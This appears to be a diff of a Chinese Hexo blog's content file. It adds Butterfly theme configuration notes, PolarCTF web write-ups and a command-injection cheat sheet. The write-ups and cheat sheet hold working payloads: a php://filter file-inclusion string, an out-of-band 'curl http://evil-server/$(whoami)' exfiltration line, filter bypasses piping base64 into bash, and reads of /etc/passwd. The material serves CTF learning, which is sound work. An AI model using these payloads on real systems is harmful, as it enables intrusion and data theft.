class="string">fa</span> <span class="string">fa-download</span>   <span class="comment">#资源</span></span><br><span class="line">  <span class="attr">tools:</span> <span class="string">/tools/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-briefcase</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable / Disable menu icons / item badges.</span></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>“||”前面是目标链接，后面是图标名称，主题使用图标来自<a href="http://www.fontawesome.com.cn/faicons/#web-application">图标库 - Font Awesome 中文网</a>，可以自己搜索图标使用</p>
+<p>新添加的菜单需要翻译对应的中文，打开theme/next/languages/zh-CN.yml，在menu下设置：</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">关于</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">资源</span></span><br><span class="line">  <span class="attr">search:</span> <span class="string">搜索</span></span><br></pre></td></tr></table></figure>
+
+<p>在根目录下，执行如下命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;resources&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在根目录sources文件夹下会生成categories、tags、about、resources四个文件，每个文件中有一个<code>index.md</code>文件，修改内容分别如下：</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">#例子</span></span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-06-29 11:35:42   # 时间随意</span><br><span class="line">type: &quot;tags&quot;                # 类型一定要为tags</span><br><span class="line">comments: false             # 提示这个页面不需要加载评论</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="主题配置优化"><a href="#主题配置优化" class="headerlink" title="主题配置优化"></a>主题配置优化</h1><p>我选butterfly的主题，所以主题是针对这个主题的，不一定适用其他主题</p>
+<h2 id="butterfly主题文章双栏布局插件"><a href="#butterfly主题文章双栏布局插件" class="headerlink" title="butterfly主题文章双栏布局插件"></a>butterfly主题文章双栏布局插件</h2><p><strong>NPM 插件安装的部署方法：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-butterfly-article-double-row --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"></span><br><span class="line">cnpm i hexo-butterfly-article-double-row --save</span><br></pre></td></tr></table></figure>
+
+<p>注意，一定要加<code>--save</code>，不然本地预览的时候可能不会显示！！！</p>
+<p><strong>新增配置</strong></p>
+<p>是网站根目录下的配置文件_config</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">butterfly_article_double_row:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>然后素质三连。</p>
+<h2 id="Butterfly添加顶部加载进度条"><a href="#Butterfly添加顶部加载进度条" class="headerlink" title="Butterfly添加顶部加载进度条"></a>Butterfly添加顶部加载进度条</h2><p>我使用的是4.7.0版本，版本已经集成了，在配置文件中直接修改就好。</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">2</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span> <span class="string">https://fastly.jsdelivr.net/gh/xlenco/JS-X@main/pace.js/pace.css</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Polarctf</title>
     <url>/posts/f2bbe48e.html</url>
     <content><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>打开靶机，有一个页面。需要你提交东西，但是提交按钮不能点击。</p>
@@ -217,6 +494,45 @@
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color:red&quot;</span>&gt;</span>我说我系签到题,你信吗<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>现在去获得flag吧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;9&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;qiandao&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">disabled</span>=<span class="string">&quot;disabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>本题突破点在语言上，text限制长度9，去掉disabled就可以进行提交。先随便提交，页面会弹窗让你提交<strong>ilovejljcxy</strong>。即可得到flag</p>
+<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>源代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>解释</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一行设置错误报告级别为 0，这表示关闭错误和警告的显示。</span><br><span class="line">第二行获取名为 file 的 GET 请求参数，如果未定义则将其默认设置为 &#x27;1&#x27;。</span><br><span class="line">第三行使用 str_replace() 函数将请求参数中的 &quot;../&quot; 字符串替换为空字符串，以防止访问上层目录的文件。</span><br><span class="line">第四行使用 include_once() 函数包含指定文件。根据上面三行代码的处理，此处的 $file 只能是当前目录下的某个 PHP 文件，而不是其他目录或上层目录中的文件。</span><br><span class="line">最后一行使用 highlight_file() 函数在浏览器中显示当前 PHP 文件的源代码。</span><br><span class="line">需要注意的是，这段代码存在安全风险，因为它允许通过 URL 参数直接包含任何 PHP 文件，并在服务器上执行该文件。如果攻击者可以控制 file 参数，则可以利用这个漏洞来执行任意 PHP 代码。建议在生产环境中谨慎使用此类代码。</span><br></pre></td></tr></table></figure>
+
+<p><strong>解法</strong></p>
+<ol>
+<li>直接访问未经授权的文件：攻击者可以将 file 参数设置为其他目录或上层目录中的 PHP 文件名，直接访问未经授权的文件。</li>
+<li>绕过 ../ 过滤：攻击者可以通过使用双字节字符或 URL 编码等技术来绕过 str_replace() 函数中的 “../“ 过滤，进而访问上级目录中的文件。</li>
+<li>文件包含漏洞：如果攻击者能够控制 file 参数，并且在该参数中注入 PHP 代码，则可以利用文件包含漏洞执行任意 PHP 代码。例如，攻击者可以将 file 参数设置为 “php://input”，并在 POST 请求中发送一个带有 PHP 代码的数据包，从而成功执行恶意代码。</li>
+</ol>
+<p><strong>解题过程</strong></p>
+<p>1.打开页面</p>
+<blockquote>
+<p>我是一个什么都不会的出题人，我啥也不知道,我只知道你不是我可耐的弟弟-。-</p>
+</blockquote>
+<p>2.修改Cookie的Value值为yes。返回Li9kYXRhL2luZGV4LnBocA</p>
+<blockquote>
+<p>base64解码：./data/index.php</p>
+</blockquote>
+<p>3.得到路径，访问得到源码</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=....//....//....//....//flags</span><br></pre></td></tr></table></figure>
+
+<p>flag{92eb5ffee6ae2fec3ad71c777531578f}</p>
+<h1 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h1><p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"><span class="variable">$txt</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="variable">$txt</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;&#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;what&#x27;s up&quot;</span>);&#125;&#125;</span><br><span class="line"><span class="variable">$yyds</span>=(<span class="variable">$_POST</span>[<span class="string">&#x27;yyds&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="variable">$yyds</span>==<span class="string">&#x27;666&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="title function_ invoke__">no</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>highlight_file(__FILE__);</code>：使用 <code>highlight_file()</code> 函数显示当前文件（由 <code>__FILE__</code> 常量表示）的源代码，并为 PHP 代码添加语法高亮。这样可以让访问者查看此 PHP 脚本的源代码。</li>
+<li><code>function no($txt)&#123;...&#125;</code>：定义一个名为 <code>no</code> 的函数，接收一个名为 <code>$txt</code> 的参数。此函数用于检查 <code>$txt</code> 参数中是否包含某些字符串（这些字符串通常与系统命令有关），以防止潜在的安全风险。</li>
+<li><code>if(!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;, $txt))&#123;...&#125;</code>：使用 <code>preg_match()</code> 函数和正则表达式检查 <code>$txt</code> 参数中是否包含这些字符串。如果没有匹配项，将返回 <code>$txt</code>；否则，执行 <code>die(&quot;what&#39;s up&quot;);</code>，终止脚本执行并输出错误信息。</li>
+<li><code>$yyds=($_POST[&#39;yyds&#39;]);</code>：从 POST 请求中获取名为 <code>&#39;yyds&#39;</code> 的参数值并将其存储在 <code>$yyds</code> 变量中。</li>
+<li><code>if(isset($_GET[&#39;sys&#39;])&amp;&amp;$yyds==&#39;666&#39;)&#123;...&#125;</code>：检查是否存在名为 <code>&#39;sys&#39;</code> 的 GET 参数，并检查 <code>$yyds</code> 变量是否等于 <code>&#39;666&#39;</code>。如果这两个条件都满足，执行大括号内的代码。</li>
+<li><code>eval(no($_GET[&#39;sys&#39;]));</code>：在满足条件的情况下，获取 GET 请求中的 <code>&#39;sys&#39;</code> 参数值，传递给 <code>no()</code> 函数进行安全检查。如果安全检查通过，使用 <code>eval()</code> 函数执行该参数值中的 PHP 代码。</li>
+<li><code>else &#123;echo &quot;nonono&quot;;&#125;</code>：如果条件不满足，输出字符串 “nonono”。</li>
+</ol>
+<p>这段代码的主要目的是接收用户输入，并在满足一定条件且经过安全检查后，执行用户提供的 PHP 代码。同时，使用highlight_file()函数显示源代码，让访问者可以查看脚本的实现。</p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -260,6 +576,20 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">平滑滚动列表框</span><br><span class="line">平滑屏幕字体边缘</span><br><span class="line">启用速览</span><br></pre></td></tr></table></figure>
 
 <p>顺便设置下 系统启动设置</p>
+]]></content>
+      <categories>
+        <category>win系统</category>
+      </categories>
+      <tags>
+        <tag>win10</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>win10报错</title>
+    <url>/posts/9ffa43eb.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在使用计算机时，因为我们自己的骚操作会产生一些奇奇怪怪的报错。因此特此积累一下自己所遇到的报错。也方便自己下次可以自己解决，也方便他人解决。</p>
+<h1 id="各种报错"><a href="#各种报错" class="headerlink" title="各种报错"></a>各种报错</h1><h2 id="Windows-PowerShell"><a href="#Windows-PowerShell" class="headerlink" title="Windows PowerShell"></a>Windows PowerShell</h2><h3 id="显示找不到快捷文件"><a href="#显示找不到快捷文件" class="headerlink" title="显示找不到快捷文件"></a>显示找不到快捷文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将C盘用户里面Default”这个用户（win10系统的默认账号）的Windows PowerShell复制到你的用下相同的目录下即可。</span><br><span class="line"></span><br><span class="line">目录</span><br><span class="line">C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>win系统</category>
@@ -1111,149 +1441,48 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo搭建个人博客教程</title>
-    <url>/posts/6e27c1a7.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本站点是由<code>Hexo+Butterfly</code>主题搭建起来的，本文章就是想记录一下网站的搭建，以及整理一下自己的思路。希望能够给初手提供一些小小的帮助。</p>
-<h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><h2 id="搭建准备"><a href="#搭建准备" class="headerlink" title="搭建准备"></a>搭建准备</h2><p>1.基础软件与工具的安装</p>
-<ul>
-<li><a href="https://github.com/">GitHub</a></li>
-<li><a href="https://git-scm.com/">Git</a></li>
-<li><a href="https://hexo.io/zh-cn/">Hexo</a></li>
-<li><a href="https://nodejs.org/en/">Node.js</a></li>
-</ul>
-<p><strong>Node安装</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官网下载，具体安装教程借鉴：https://blog.csdn.net/web18224617243/article/details/123191441</span><br></pre></td></tr></table></figure>
+    <title>命令执行漏洞</title>
+    <url>/posts/a43e8dc0.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
+<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
+<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
 
-<p><strong>Git安装</strong></p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">去官网下载，具有安装教程借鉴：</span><br><span class="line">https://blog.csdn.net/mukes/article/details/115693833</span><br></pre></td></tr></table></figure>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
 
-<p><strong>Hexo安装</strong></p>
-<p>安装<strong>Hexo</strong>，在<strong>Git Bash</strong>中执行以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
 
-<p>创建一个新目录，我的是<code>D:\program\blog</code>，并且执行初始化：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init Blog</span><br><span class="line">或</span><br><span class="line">cd Blog &amp;&amp; hexo init</span><br></pre></td></tr></table></figure>
+<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
 
-<p>2.本地搭建</p>
-<p>先后执行下面命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
+<p>Linux下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
 
-<p>访问默认地址 <strong><a href="http://localhosy:4000/">http://localhosy:4000</a></strong> 就可以查看到搭建起来的博客，<strong>Ctrl+C</strong>就可以停止服务。</p>
-<p>如果4000端口被占用，使用以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s -p 5000 （端口自定义）</span><br></pre></td></tr></table></figure>
+<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
 
-<hr>
-<h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><ol>
-<li><p>在GitHub上新建一个仓，仓库与你的用户名相同，仓要公开。</p>
-<p>注意： 仓库名称的<strong>前半部分与你的用户名一致</strong>，即 lummod，<strong>后半部分为 yourname.git.io 固定格式</strong>（忽略红色警告，因为我已经创建过了！），可以选择一个readme为说明文件（随便），然后<strong>点击创建仓库</strong></p>
-</li>
-<li><p>在博客目录下，执行以下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm insatll -g hexo-cli</span><br><span class="line">hexo init （如果前面初始化和安装过就不用了）</span><br></pre></td></tr></table></figure></li>
-<li><p>绑定GitHub，添加SSH key，命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot;</span><br></pre></td></tr></table></figure>
+<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
 
-<p>添加到 GitHub ，复制密钥文件内容（路径如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>），粘贴到 <a href="https://github.com/settings/keys">New SSH Key</a>即可。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">yes</span><br></pre></td></tr></table></figure>
+<p>liunx绕开空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
 
-<p>接着输入命令连接：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">yes</span><br></pre></td></tr></table></figure>
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
 
-<p>测试，如果回显返回“You’ve successfully authenticated”即成功。</p>
-</li>
-<li><p>打开根目录下的_config.yml，写入：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/fengye97/fengye97.github.io.git  #你的仓库地址</span><br><span class="line">  branch: master 你的目录 </span><br><span class="line">  #ps: 要注意空格</span><br></pre></td></tr></table></figure></li>
-<li><p>安装Git部属插件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">日常三连: hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
 
-<p>如果成功，输入github域名即可进入</p>
-</li>
-</ol>
-<h2 id="解析域名"><a href="#解析域名" class="headerlink" title="解析域名"></a>解析域名</h2><p>本步骤需要购买域名，我用的是阿里云，所以就以阿里云为例。</p>
-<p>第一步：在阿里云控制台中，点击解析并添加两条解析记录</p>
-<ol>
-<li><p>添加 CNAME 记录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类型选择为 CNAME；</span><br><span class="line"></span><br><span class="line">主机记录即域名前缀为www；</span><br><span class="line"></span><br><span class="line">记录值填写为yourname.github.io；</span><br><span class="line"></span><br><span class="line">解析线路，TTL 默认即可。</span><br></pre></td></tr></table></figure></li>
-<li><p>添加 两条A 记录指向 192.30.252.153和192.30.252.154</p>
-<p>类型选择为 A；</p>
-<p>主机记录即域名前缀，填写为@；</p>
-<p>记录值填写为192.30.252.153和192.30.252.154；</p>
-<p>解析线路，境外或谷歌。</p>
-</li>
-</ol>
-<p>A记录类型的记录值为<strong>IPV4</strong>地址，通过ping域名得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping zhou-boop.github.io    #ping + 你的GitHub的网址</span><br></pre></td></tr></table></figure>
+<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
